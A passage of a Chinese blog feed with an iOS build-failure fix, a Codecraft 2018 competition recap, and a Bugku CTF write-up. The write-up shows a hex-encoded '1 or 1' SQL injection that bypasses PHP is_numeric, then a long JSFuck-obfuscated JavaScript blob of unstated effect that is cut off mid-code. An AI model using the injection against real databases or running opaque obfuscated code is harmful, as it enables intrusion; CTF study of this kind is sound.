0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5781      0  0:05:01  0:04:23  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5759      0  0:05:03  0:04:24  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5737      0  0:05:04  0:04:25  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5716      0  0:05:05  0:04:26  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5694      0  0:05:06  0:04:27  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5673      0  0:05:07  0:04:28  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5652      0  0:05:08  0:04:29  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5631      0  0:05:09  0:04:30  0:00:39     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5610      0  0:05:11  0:04:31  0:00:40     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5589      0  0:05:12  0:04:32  0:00:40     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5569      0  0:05:13  0:04:33  0:00:40     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5549      0  0:05:14  0:04:34  0:00:40     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5528      0  0:05:15  0:04:35  0:00:40     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5528      0  0:05:15  0:04:35  0:00:40     0</span><br><span class="line">curl: (56) Recv failure: Connection reset by peer</span><br><span class="line"></span><br><span class="line">** ARCHIVE FAILED **</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The following build commands failed:</span><br><span class="line">	PhaseScriptExecution Run\ Script /Users/ainassine/Library/Caches/org.carthage.CarthageKit/DerivedData/9.4.1_9F2000/MMDB-Swift/0.2.8/Build/Intermediates.noindex/ArchiveIntermediates/MMDB-iOS/IntermediateBuildFilesPath/MMDB.build/Release-iphoneos/MMDB-iOS.build/Script-366F5FDD1F05152C00DE3883.sh</span><br><span class="line">(1 failure)</span><br></pre></td></tr></table></figure></p>
<p>可以看出是网络问题导致failure的出现。打开当时执行的脚本，得到代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$SRCROOT</span>/MMDB/GeoLite2-Country.mmdb ] || [ <span class="variable">$CONFIGURATION</span> == <span class="string">"Release"</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$SRCROOT</span>/update_database.sh</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p>
<p>打开update_database.sh发现如下命令是问题所在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o $tmpfile http://geolite.maxmind.com/download/geoip/database/GeoLite2-Country.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>可以通过给代理的方法顺利执行上面的命令。这里我用的是<code>proxychains</code>。</p>
]]></content>
      
        
        <tags>
            
            <tag> iOS </tag>
            
            <tag> NEKit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[codecraft2018]]></title>
      <url>/blog/public/2018/04/16/codecraft2018</url>
      <content type="html"><![CDATA[<h1 id="Codecraft-2018-ENDS-…-初赛"><a href="#Codecraft-2018-ENDS-…-初赛" class="headerlink" title="Codecraft 2018 ENDS … (初赛)"></a>Codecraft 2018 ENDS … (初赛)</h1><h2 id="0x00-历程"><a href="#0x00-历程" class="headerlink" title="0x00 历程"></a>0x00 历程</h2><p>华为的Codecraft比赛是大学的时候就有参加过的，第一次是2016年，那是第二届Codecraft，当时的赛题是一种寻路问题，大三的我在找为找工作考虑才参加了这个比赛。当然大学的时候很咸鱼（现在也是），参加比赛也都是碰碰运气。很多算法——群智能、模拟退化、遗传算法等等——在那之前也都对我来说闻所未闻，我所能做的无非是利用暴力搜索的方法去寻找最好的路径，也仅仅只能通过五个初级用例，根本没有上榜的机会。<br><br>2017年春天的Codecraft，那时候我已经是大四的学生了，在做毕设的阶段，当时的题目是网络流量相关的网络节点分配的问题，碰巧，我的毕设题目也是跟这个相关的（《无线传感器网络中最优的存储方案》），毕设我用的是0-1整数规划，用到了lingo来完成计算。不过这一年我只用来享受大学最后一年的惬意了——毕业去向有着落，也没有什么烦恼，每天打球、打游戏，依旧咸鱼着。<br><br>然后就是今年的Codecraft了。<br></p>
<h2 id="0x01-赛题"><a href="#0x01-赛题" class="headerlink" title="0x01 赛题"></a>0x01 赛题</h2><p><img src="http://ainassine.cn/blog/public/images/codecraft2018_1.png" alt="赛题"></p>
<h2 id="0x02-内容"><a href="#0x02-内容" class="headerlink" title="0x02 内容"></a>0x02 内容</h2><p>我们开始做题是3月9日，当时比赛已经开始了一两天。最开始觉得用C++可能代码速度快一些，但是写完C++的数据处理之后我觉得编写很吃力就没有继续下去了，转而使用了比较简单方便的python作为编程语言。<br>其实问题主要分为两个部分：预测和装箱。赛题虽说是面向机器学习，但是像我这样没有对机器学习深入了解过的还是能比着葫芦画瓢写出一个有效的程序的，甚至通过一些毫无道理的手段就能获得不错的分数，可以说门槛非常之低。<br>我们将每种规格虚拟机历史购买记录处理为x-y形式的数据，与数据中的第一天的日期的相差天数作为x，而y是当前时间内该种规格虚拟机的订单数量，所以整体来说数据是呈现上升状态的。<br><img src="http://ainassine.cn/blog/public/images/flavors.png" alt="data_xy"><br>数据抽取之后才是正式的比赛编程。<br>预测：</p>
<ol>
<li><strong>平均数</strong>：一开始就像比赛群里说的那样，我们提交了平均数的代码，对于每种规格虚拟机，期预测数目计算为：<code>predicted_num = (last_day_num / last_day_x) * num_predict_days</code>，其中<code>last_day_num</code>是该规格虚拟机在训练阶段最后一天的数量，<code>last_day_x</code>是最后一天对应的x坐标，<code>num_predict_days</code>是预测时间的长度。</li>
<li><strong>LS</strong>：最小二乘法，是我们到最后采用的算法，使用最后的7条数据获得线性模型，通过系数调整获得了我们的最高分。</li>
<li><strong>TLS</strong>：总体最小二乘法，一般来说TLS获得的斜率相较于LS获得的斜率会更加陡峭一些，而LS预测的模型经过大于一的系数处理之后得到了更高的分数，说明LS预测的结果偏低，故而我们尝试采用TLS，但效果不明显，调整系数前TLS稍优，而经过系数调整LS优势较大。</li>
<li><strong>HMM</strong>：隐马尔科夫模型，重写了python的HMM，过程复杂，涉及较多矩阵计算，最后虽然重写完成，但是应用效果差。</li>
<li><strong>SVR</strong>：支持向量回归。利用libsvm进行了测试，线性核效果稍好，但是也不及LS。</li>
</ol>
<p>装箱：</p>
<ol>
<li><strong>Ratio Distribute</strong>：基于比率的分配，鉴于服务器有CPU、MEM两种指标，都要求不能超分，而对于每种虚拟机规格来说，其CPU:MEM比值可能会比较小，比如1:4，那么对于一个56CPU、128MEM的物理机来说，其CPU:MEM为1:3，这样的虚拟机装物理机就会产生碎片，故而我想到在装载过程中计算物理机剩余资源的CPU与MEM的比值，尽量装载与该比值相近的虚拟机，装的时候优先考虑CPU或者MEM数值较大的物理机进行装载。感觉这样是一种贪心的算法，经过实际测试速度很快，但是效果不是最优。</li>
<li><strong>DP Distribute</strong>：受到论坛中<a href="https://forum.huaweicloud.com/forum.php?mod=viewthread&amp;tid=7943&amp;highlight=" target="_blank" rel="noopener">[技术探讨] 【自制case】求大佬们跑出来CPU100% MEM100% :) :) :)</a>的启发，我们发现自己的装箱算法得到的效果不是最好的，于是开始着手使用动态规划进行处理。在动态规划的处理过程中，我们在装载的时候优先使用较大规格的虚拟机进行装载。最后效果较好，收获到提分。</li>
</ol>
<h2 id="0x04-最后"><a href="#0x04-最后" class="headerlink" title="0x04 最后"></a>0x04 最后</h2><p>今天成绩公布，赛区48告别比赛，也有同学采用ARIMA模型取得24名成绩进入复赛，虽然在比赛过程中看到过这样的模型，但是由于它比较复杂没有着手去实现。<br>无论如何，受益良多。</p>
<p>git: <a href="https://github.com/Joeeyy/cf2018" target="_blank" rel="noopener">https://github.com/Joeeyy/cf2018</a></p>
]]></content>
      
        <categories>
            
            <category> 赛后总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CodeCraft </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Bugku-writeup]]></title>
      <url>/blog/public/2018/03/03/Bugku-writeup</url>
      <content type="html"><![CDATA[<p>#</p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>0×00 简介<br>国内一部分CMS程序里面有用到过is_numberic函数，我们先看看这个函数的结构<br>bool is_numeric ( mixed $var )<br>如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
<p>0×01 函数是否安全<br>接下来我们来看个例子，说明这个函数是否安全。</p>
<p>$s = is_numeric($_GET[‘s’])?$_GET[‘s’]:0;<br>$sql=”insert into test(type)values($s);”;//是 values($s) 不是values(‘$s’)<br>mysql_query($sql);<br>上面这个片段程序是判断参数s是否为数字，是则返回数字，不是则返回0，然后带入数据库查询。（这样就构造不了sql语句）<br>我们把‘1 or 1’ 转换为16进制 0x31206f722031 为s参数的值<br>程序运行后，我们查询数据库看看，如</p>
<h2 id="a-宽字节注入"><a href="#a-宽字节注入" class="headerlink" title="a 宽字节注入"></a>a 宽字节注入</h2><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]